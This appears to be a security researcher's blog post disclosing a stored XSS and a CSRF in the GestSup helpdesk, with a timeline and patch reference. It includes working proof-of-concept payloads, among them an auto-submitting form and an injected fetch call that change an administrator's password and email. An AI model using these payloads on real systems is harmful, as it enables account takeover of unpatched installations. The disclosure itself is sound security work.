---
date: "2024-02-12T11:40:54+02:00"
draft: false
title: "CVE in GestSup"
summary: "I discovered two vulnerabilites affecting GestSup: a stored XSS (CVE-2023-52059) and a CSRF (CVE-2023-52060)."
tags: ["CVE", "Web"]
---
## üìù TL;DR
GestSup is an open-source helpdesk application written in PHP. In december 2023, I discovered two vulnerabilities affecting GestSup following a security assessment. These are a stored XSS and a CSRF which allow for account takeover.

## üëæ CVE-2023-52059

### Summary

| ID                    | CVE-2023-52059                                           |
|-----------------------|----------------------------------------------------------|
| **Type**              | XSS                                                      |
| **Title**             | Stored XSS in ticket's description and resolution fields |
| **Product impacted**  | Gestsup                                                  |
| **Impacted version**  | < 3.2.46                                                 |
| **CVSS Score**        | 5.4                                                      |
| **Author**            | Sopalinge                                                |

### Description

A lack of user input back-end sanitization allows remote attackers to perform a stored Cross-Site Scripting (XSS) attack in Gestsup < 3.2.46.

When creating or editing a ticket, an unprivileged user is able to intercept and edit the `Description` and `Resolution` fields directly in the request to bypass front-end sanitization and store malicious HTML content.


### Impact

An unprivileged user is then able to execute script on any user's browser who are viewing the malicious ticket.

The session cookie has the HttpOnly attribute, which protects it from client-side extraction.

However, combined with [CVE-2023-52060](#-cve-2023-52060), it can be used to take over privileged accounts directly from the Gestsup application.


### Proof of concept

In the `Description` or `Resolution` fields, the following payload can be injected in the intercepted request to pop an alert when any user view the malicious ticket :

```HTML
<img src=x onerror="alert('XSS')" />
```

### Demo

{{< video src="https://github.com/Tanguy-Boisset/CVE/assets/83412402/deacf3e8-8f6e-44b2-ba41-85b895f534c9" >}}


## üëæ CVE-2023-52060

### Summary

| ID                    | CVE-2023-52060                                           |
|-----------------------|----------------------------------------------------------|
| **Type**              | CSRF                                                     |
| **Title**             | CSRF on profile's information change request             |
| **Product impacted**  | Gestsup                                                  |
| **Impacted version**  | < 3.2.46                                                 |
| **CVSS Score**        | 4.3                                                      |
| **Author**            | Sopalinge                                                |

### Description

A lack of CSRF protection in the request to edit a user's profile information in Gestsup < 3.2.46 allows attackers to perform a Cross-Site Request Forgery (CSRF) attack.

The `index.php?page=admin/user&action=edit&userid=1&tab=infos` endpoint can be exploited to craft a malicious POST request which can be used to trick users into unknowingly changing their information, including email address and password.


### Impact

An attacker could trick another user into unknowingly changing their password when visiting a malicious website. Note that the SameSite attribute is not defined which means that the behaviour will depend on the victim's browser.

Combined with [CVE-2023-52059](#-cve-2023-52059), it can be used to take over privileged accounts directly from the Gestsup application.


### Proof of concept

The following HTTP code can be hosted on a malicious website. A user tricked into visiting this page has a risk (depedning on multiple factors like the browser used) to have his password, email and function edited.

```HTML
<form id="autosubmit" action="http://localhost:3010/gestsup/index.php?page=admin/user&action=edit&userid=1&tab=infos" method="POST">
    <input type="hidden" name="attachment" value="0" />
    <input type="hidden" name="language" value="fr_FR" />
    <input type="hidden" name="profile" value="4" />
    <input type="hidden" name="firstname" value="admin" />
    <input type="hidden" name="lastname" value="" />
    <input type="hidden" name="login" value="admin" />
    <input type="hidden" name="password" value="admin" />
    <input type="hidden" name="password2" value="admin" />
    <input type="hidden" name="mail" value="admin@example.com" />
    <input type="hidden" name="function" value="hacked" />
    <input type="hidden" name="modify" value="modify" />
    <input type="submit" value="Submit request" />
</form>
<script>
    document.getElementById("autosubmit").submit();
</script>
```
### Demo

{{< video src="https://github.com/Tanguy-Boisset/CVE/assets/83412402/3bf74a94-c885-40f2-a13e-eda5334affc5" >}}


## üòà Exploitation of both vulnerabilities

Combining both [CVE-2023-52059](#-cve-2023-52059) and [CVE-2023-52060](#-cve-2023-52060) in the `Description` or `Resolution` fields, the following payload can be injected in the intercepted request to exploit the CSRF to change the pasword, email and function of any user viewing the ticket :

```HTML
<img src=x onerror="fetch('./index.php?page=admin/user&action=edit&userid=1&tab=infos', {method: 'POST', headers: {'Content-Type':'application/x-www-form-urlencoded'},body: 'attachment=0&language=fr_FR&profile=4&firstname=admin&lastname=&login=admin&password=admin&password2=admin&mail=admin@example.com&function=hacked&modify=modify'})" />
```
### Demo

{{< video src="https://github.com/Tanguy-Boisset/CVE/assets/83412402/69514524-4530-47b6-907e-0b593bd4e691" >}}


## üìÜ Timeline

- 24/12/2023 : Vulnerability discovered
- 24/12/2023 : Vendor contacted
- 25/12/2023 : Official fix published
- 25/01/2024 : CVE ID attributed
- 12/02/2024 : CVE publicly disclosed


## üìñ References

- [Gestsup website](https://gestsup.fr/index.php?page=home)
- [Fixing patch](https://gestsup.fr/index.php?page=download&channel=beta&version=3.2.46&type=patch)